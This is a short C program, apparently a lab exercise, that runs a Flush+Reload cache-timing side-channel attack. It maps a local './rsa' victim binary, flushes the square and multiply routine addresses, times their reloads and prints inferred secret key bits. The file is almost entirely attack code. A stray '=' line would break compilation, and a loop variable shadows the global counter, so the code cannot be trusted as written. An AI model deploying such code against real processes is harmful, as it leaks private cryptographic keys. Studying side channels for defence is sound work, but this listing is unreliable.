#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <x86intrin.h>

const int T_multiply = 0x1280;
const int T_square = 0x1200;
int i = 0;
int j = 0;


static inline uint64_t rdtsc_begin(void) {
    _mm_lfence();
    return __rdtsc();
}

static inline uint64_t rdtsc_end(void) {
    unsigned int aux;
    uint64_t t = __rdtscp(&aux);
    _mm_lfence();
    return t;
} 

// mapping the victim executable
int main (int argc, char *argv[]){
    int rsa = open("./rsa", O_RDONLY);

    // finding out the size
    struct stat file;
    stat("./rsa", &file);

    void *map = mmap(NULL, file.st_size, PROT_READ, MAP_SHARED, rsa, 0);

    char *square = (char *) map + T_square;
    char *multiply = (char *) map + T_multiply;
    uint64_t diff = 0;
    uint64_t sum;

    while(i<8) {
        _mm_clflush(square);
        _mm_clflush(multiply);
   
        for (volatile int i = 0; i < 100000; i++);
=
            uint64_t t0 = rdtsc_begin();
            volatile char v = *square;
            uint64_t t1 = rdtsc_end();        
            uint64_t time_square = t1-t0;


            uint64_t t2 = rdtsc_begin();
            volatile char v2 = *multiply;
            uint64_t t3 = rdtsc_end();        
            uint64_t time_multiply = t3-t2;
        
        printf("time_square: %lu, time_multiply: %lu\n", time_square, time_multiply);

        if (time_multiply > 280) {
            printf("bit %d is: %d\n", i, 0);
        }
        else {
            printf("bit %d is: %d\n", i, 1);
        } 
    i ++;
    }
        
}

